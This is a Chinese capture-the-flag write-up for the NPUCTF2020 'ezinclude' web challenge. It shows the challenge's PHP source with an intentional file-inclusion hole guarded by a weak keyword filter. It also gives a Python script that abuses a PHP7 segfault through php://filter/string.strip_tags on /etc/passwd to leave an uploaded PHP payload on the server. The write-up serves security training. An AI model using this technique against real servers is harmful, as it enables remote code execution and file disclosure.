# 原创
：  [NPUCTF2020]ezinclude

# [NPUCTF2020]ezinclude

#### [NPUCTF2020]ezinclude

## 考点

> 
php7 segment fault特性、伪协议


## 思路

> 



<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210601113703822.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210601113633119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210601113737155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021060111381359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 



> 
访问文件


## Payload

> 
index.php


```
&lt;?php
include 'config.php';
@$name=$_GET['name'];
@$pass=$_GET['pass'];
if(md5($secret.$name)===$pass){
        echo '&lt;script language="javascript" type="text/javascript"&gt;
           window.location.href="flflflflag.php";
        &lt;/script&gt;
';
}else{
        setcookie("Hash",md5($secret.$name),time()+3600000);
        echo "username/password error";
}
?&gt;
&lt;html&gt;
&lt;!--md5($secret.$name)===$pass --&gt;
&lt;/html&gt;

```

> 
flflflflag.php


```
&lt;html&gt;
&lt;head&gt;
&lt;script language="javascript" type="text/javascript"&gt;
           window.location.href="404.html";
&lt;/script&gt;
&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;
&lt;/head&gt;
&lt;&gt;
&lt;body&gt;
&lt;?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
        die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?&gt;
&lt;/body&gt;
&lt;/html&gt;

```

> 
config.php


```
&lt;?php
$secret='%^$&amp;$#fffdflag_is_not_here_ha_ha';
?&gt;

```

> 
php7 segment fault特性利用脚本


```
import requests
from io import BytesIO
url="http://f325d633-efa0-4a8c-a61d-90fc70c9ea1d.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"
payload="&lt;?php phpinfo();?&gt;"
files={
    "file":BytesIO(payload.encode())
}
r=requests.post(url=url,files=files,allow_redirects=False)

print(r.text)

```
